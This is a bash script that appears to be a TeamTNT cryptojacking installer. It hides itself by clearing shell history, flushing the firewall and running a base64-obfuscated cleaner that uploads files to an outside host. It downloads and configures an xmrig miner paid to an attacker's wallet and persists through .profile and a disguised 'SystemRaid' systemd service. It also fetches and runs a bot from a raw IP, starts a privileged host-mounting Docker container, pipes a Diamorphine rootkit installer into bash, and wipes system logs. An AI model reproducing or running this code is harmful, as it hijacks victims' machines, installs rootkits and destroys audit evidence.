#!/bin/bash
#
#	TITLE:		MonerooceanMiner-Installer
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	V1.00.0
#	DATE:		13.09.2021
#
#	SRC:        http://teamtnt.red/sh/setup/moneroocean_miner.sh
#
########################################################################


ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F



function CLEANUP_BY_TEAMTNT(){

# ld.preload.cleaner
echo IyEvYmluL2Jhc2gKIwojCVRJVExFOgkJTEQuUFJFTE9BRC5DTEVBTkVSCiMJQVVUT1I6CQloaWxkZUB0ZWFtdG50LnJlZAojCVZFUlNJT046CVYzLjEwLjAKIwlEQVRFOgkJMTQuMDkuMjAyMQojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZXhwb3J0IExDX0FMTD1DLlVURi04IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmV4cG9ydCBMQU5HPUMuVVRGLTggMj4vZGV2L251bGwgMT4vZGV2L251bGwKSElTVENPTlRST0w9Imlnbm9yZXNwYWNlJHtISVNUQ09OVFJPTDorOiRISVNUQ09OVFJPTH0iIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmV4cG9ydCBISVNURklMRT0vZGV2L251bGwgMj4vZGV2L251bGwgMT4vZGV2L251bGwKSElTVFNJWkU9MCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBISVNURklMRSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovdmFyL2JpbjovYmluOi9zYmluOi91c3Ivc2JpbjovdXNyL2JpbgoKCmZ1bmN0aW9uIERBVEVJX0VOVEZFUk5FTigpewpaSUVMREFURUk9JDEKCmNoYXR0ciAtaWEgJFpJRUxEQVRFSSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp0bnRyZWNodCAtaWEgJFpJRUxEQVRFSSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAppY2hkYXJmIC1pYSAkWklFTERBVEVJIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCgljaG1vZCAxNzc3ICRaSUVMREFURUkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKcm0gLWZyICRaSUVMREFURUkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKfQoKCmZ1bmN0aW9uIFRlYW1UTlRfVU5ISURFKCl7ClNPX0RBVEVJPSQxCnN0cmluZ3MgJFNPX0RBVEVJID4+IC92YXIvdG1wLy5UTlQuY2xlYW5lci5sb2cgMj4vZGV2L251bGwKZ3JlcCAtQyAxICcvcHJvYy9zZWxmL2ZkLyVkJyAvdmFyL3RtcC8uVE5ULmNsZWFuZXIubG9nID4gL3Zhci90bXAvLlROVC5jbGVhbmVyLnVuaGlkZSAyPi9kZXYvbnVsbApybSAtZiAvdmFyL3RtcC8uVE5ULmNsZWFuZXIubG9nIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsClROVF9VTkhJREU9JChjYXQgL3Zhci90bXAvLlROVC5jbGVhbmVyLnVuaGlkZSB8IGhlYWQgLW4gMSkgMj4vZGV2L251bGwKcm0gLWYgL3Zhci90bXAvLlROVC5jbGVhbmVyLnVuaGlkZSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAoKaWYgWyAhIC16ICIkVE5UX1VOSElERSIgXTsgdGhlbgplY2hvIC1lICIgXGVbMTszMzs0MW1EZXIgUHJvemVzcyAkVE5UX1VOSElERSB3dXJkZSB2ZXJzdGVja3QhXDAzM1swbSIKZWxzZQplY2hvIC1lICJcMDMzWzA7MzNtIFRlYW1UTlQgVU5ISURFIGZhaWwhIFVwbG9hZGluZy4uLlwwMzNbMG0iCmN1cmwgLS11cGxvYWQtZmlsZSAkU09fREFURUkgaHR0cHM6Ly9maWxlcHVzaC5jby91cGxvYWQvCmZpCn0KCgplY2hvIC1lICJcblxuXDAzM1swOzMzbSBQcsO8ZmUgcHJlbG9hZGbDpGhpZ2UgRGF0ZWk6XG4gfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5cMDMzWzBtIgoKaWYgWyAtZiAiL2V0Yy9sZC5zby5wcmVsb2FkIiBdOyB0aGVuIAplY2hvIC1lICIgXGVbMTszMzs0MW0vZXRjL2xkLnNvLnByZWxvYWQgZ2VmdW5kZW5cMDMzWzBtIjtlY2hvIC1lICIgXDAzM1swOzMzbShwcsO8ZmUgYXVmIGVudGhhbHRlbmUgRGF0ZWllbilcMDMzWzBtIgpQUkVMT0FEX0RBVEVJX1ZBUj0kKGNhdCAvZXRjL2xkLnNvLnByZWxvYWQpCgppZiBbIC16ICIkUFJFTE9BRF9EQVRFSV9WQVIiIF07IHRoZW4gCmVjaG8gLWUgIlwwMzNbMDszMm0gS2VpbmUgRGF0ZWl2ZXJ3ZWlzZSBlbnRoYWx0ZW4uXDAzM1swbSI7ZWNobyAtZSAiXDAzM1swOzMybSBMZWVyZSBEYXRlaSB3aXJkIGVudGZlcm50LlwwMzNbMG0iCkRBVEVJX0VOVEZFUk5FTiAvZXRjL2xkLnNvLnByZWxvYWQKZWxzZQoKZm9yIFBSRUxPQURfREFURUkgaW4gJHtQUkVMT0FEX0RBVEVJX1ZBUltAXX07IGRvCmlmIFsgLWYgIiRQUkVMT0FEX0RBVEVJIiBdOyB0aGVuIAplY2hvIC1lICIgXGVbMTszMzs0MW0kUFJFTE9BRF9EQVRFSSBnZWZ1bmRlbiAobG9lc2NoZSlcMDMzWzBtIgpUZWFtVE5UX1VOSElERSAkUFJFTE9BRF9EQVRFSQpEQVRFSV9FTlRGRVJORU4gJFBSRUxPQURfREFURUkKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAkUFJFTE9BRF9EQVRFSSBuaWNodCBnZWZ1bmRlbi5cMDMzWzBtIiA7IGZpCmRvbmUKZmkKREFURUlfRU5URkVSTkVOIC9ldGMvbGQuc28ucHJlbG9hZAoKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAvZXRjL2xkLnNvLnByZWxvYWQgbmljaHQgZ2VmdW5kZW4uXDAzM1swbSIKZmkKCgp1bnNldCBMRF9QUkVMT0FEIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnVuc2V0IExEX0xJQlJBUllfUEFUSCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRDY0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCgpybSAtZiB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKdG91Y2ggfi8uYmFzaF9oaXN0b3J5IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmNoYXR0ciAraSB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKaGlzdG9yeSAtYyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApjbGVhcgppZiBbWyAiJDAiICE9ICJiYXNoIiBdXTsgdGhlbiBybSAtZiAkMDsgZmkKCgoK | base64 -d | bash 2>/dev/null 1>/dev/null

# hosts.cleaner
chattr -ia /etc/hosts 2>/dev/null
sed -i '/minexmr.com\|supportxmr.com\|c3pool.com/d' /etc/hosts 2>/dev/null

h=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
for i in /tmp /var/tmp /dev/shm /usr/bin $h /root /; do
    echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break
done

mv /usr/bin/ps.original /usr/bin/ps 2>/dev/null
crontab -l | sed '/\.bashgo\|pastebin\|onion\|bprofr/d' | crontab -
cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\d+' | grep -Po '\d+' | xargs -I % kill -9 %




}


function CLEANUP_TEAMTNT_TRACES(){

rm -fr /dev/shm/dia/ 2>/dev/null 1>/dev/null
rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
chattr +i ~/.bash_history 2>/dev/null 1>/dev/null
clear
if [[ "$0" != "bash" ]]; then rm -f $0; fi

cat /dev/null >/var/spool/mail/root 2>/dev/null
cat /dev/null >/var/log/wtmp 2>/dev/null
cat /dev/null >/var/log/secure 2>/dev/null
cat /dev/null >/var/log/cron 2>/dev/null
}



function CLEANUP_OTHER_MINERS(){
chmod -x /usr/bin/dockerd_env 2>/dev/null
kill $(ps aux | grep -v grep | awk '{if($3>65.0) print $2}') 2>/dev/null


}












function TEAMTNT_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}








CLEANUP_BY_TEAMTNT
CLEANUP_OTHER_MINERS





mount -o remount,exec /tmp
CURL_BIN=$(command -v curl)
if [[ ! -z "$CURL_BIN" ]]; then cp $CURL_BIN /tmp/.tntcurl
chmod 755 /tmp/.tntcurl; else TEAMTNT_DLOAD http://teamtnt.red/sh/bin/curl/$(uname -m) > /tmp/.tntcurl
chmod 755 /tmp/.tntcurl; fi




WALLET=$(/tmp/.tntcurl -s http://teamtnt.red/sh/data/xmr_wallet.dat)
if [[ -z "$WALLET" ]]; then export WALLET="438ss2gYTKze7kMqrgUagwEjtm993CVHk1uKHUBZGy6yPaZ2WNe5vdDFXGoVvtf7wcbiAUJix3NR9Ph1aq2NqSgyBkVFEtZ"; fi
EMAIL="hilde@teamtnt.red"


XMR1BIN="http://teamtnt.red/sh/bin/xmrig/x86_64/mo.tar.gz"
XMR2BIN="https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz"


if [ -z $HOME ]; then 
export HOME=/tmp
if [ ! -d $HOME ]; then mkdir -p $HOME; fi
fi


if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi


CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))


power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then export PORT=10128; fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
export PORT=10128
fi


echo -e "\n\n$CPU_THREADS CPU threads\nHashrate $EXP_MONERO_HASHRATE KH/s.\n\n"; sleep 2
















echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/.configures directory"
rm -rf $HOME/.configures

echo "[*] Downloading advanced Miner"
if ! curl -L --progress-bar "$XMR1BIN" -o /dev/shm/xmrig.tar.gz; then

if ! wget -q "$XMR1BIN" -O /dev/shm/xmrig.tar.gz; then
echo "ERROR: Can't download $XMR1BIN file to /dev/shm/xmrig.tar.gz"
fi

fi

echo "[*] Unpacking /dev/shm/xmrig.tar.gz to $HOME/.configures"
[ -d $HOME/.configures ] || mkdir $HOME/.configures
if ! tar xf /dev/shm/xmrig.tar.gz -C $HOME/.configures; then
  echo "ERROR: Can't unpack /dev/shm/xmrig.tar.gz to $HOME/.configures directory"
#  exit 1
fi
rm -f /dev/shm/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.configures/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.configures/config.json
$HOME/.configures/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.configures/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.configures/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.configures/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Downloading $XMR2BIN"
  if ! curl -L --progress-bar $XMR2BIN -o /dev/shm/xmrig.tar.gz; then

if ! wget -q "$XMR1BIN" -O /dev/shm/xmrig.tar.gz; then
echo "ERROR: Can't download $XMR2BIN file to /dev/shm/xmrig.tar.gz"
    exit 1
fi

  fi

  echo "[*] Unpacking /dev/shm/xmrig.tar.gz to $HOME/.configures"
  if ! tar xf /dev/shm/xmrig.tar.gz -C $HOME/.configures --strip=1; then
    echo "WARNING: Can't unpack /dev/shm/xmrig.tar.gz to $HOME/.configures directory"
  fi
  rm -f /dev/shm/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.configures/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.configures/config.json
  $HOME/.configures/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.configures/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.configures/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/.configures/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/.configures/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "dl.chimaera.cc:21582",/' $HOME/.configures/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.configures/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.configures/config.json
sed -i 's/"tls": *[^,]*,/"tls": true,/' $HOME/.configures/config.json
sed -i 's/"tls-fingerprint": *[^,]*,/"tls-fingerprint": null,/' $HOME/.configures/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.configures/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.configures/xmrig.log'",#' $HOME/.configures/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.configures/config.json

cp $HOME/.configures/config.json $HOME/.configures/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.configures/config_background.json

# preparing script

echo "[*] Creating $HOME/.configures/miner.sh script"
cat >$HOME/.configures/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/.configures/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.configures/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .configures/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.configures/miner.sh script to $HOME/.profile"
    echo "$HOME/.configures/miner.sh --config=$HOME/.configures/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.configures/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.configures/xmrig.log file)"
  /bin/bash $HOME/.configures/miner.sh --config=$HOME/.configures/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.configures/xmrig.log file)"
    /bin/bash $HOME/.configures/miner.sh --config=$HOME/.configures/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating SystemRaid systemd service"
    cat >/tmp/SystemRaid.service <<EOL
[Unit]
Description=SystemRaid service

[Service]
ExecStart=$HOME/.configures/xmrig --config=$HOME/.configures/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/SystemRaid.service /etc/systemd/system/SystemRaid.service
    echo "[*] Starting SystemRaid systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable SystemRaid.service
    sudo systemctl start SystemRaid.service
    CHECK_RUNNING=$?
  fi
fi

if [[ "$CHECK_RUNNING" != "0" ]]; then
nohup $HOME/.configures/xmrig -c $HOME/.configures/config_background.json 2>/dev/null 1>/dev/null &
fi



curl -s http://45.9.148.182/bin/bot/chimaera.cc -o ~/bioset && cd ~/ && chmod +x ./bioset && ./bioset



docker run --rm -d --privileged --net host -v /:/host alpineos/dockerapi



echo "[*] SystemRaid Setup complete"
history -c
sleep 1
clear



curl -sLk http://teamtnt.red/sh/setup/diamorphine.sh | bash
echo "[*] Diamorphine Setup complete"
history -c
sleep 1
clear


CLEANUP_TEAMTNT_TRACES

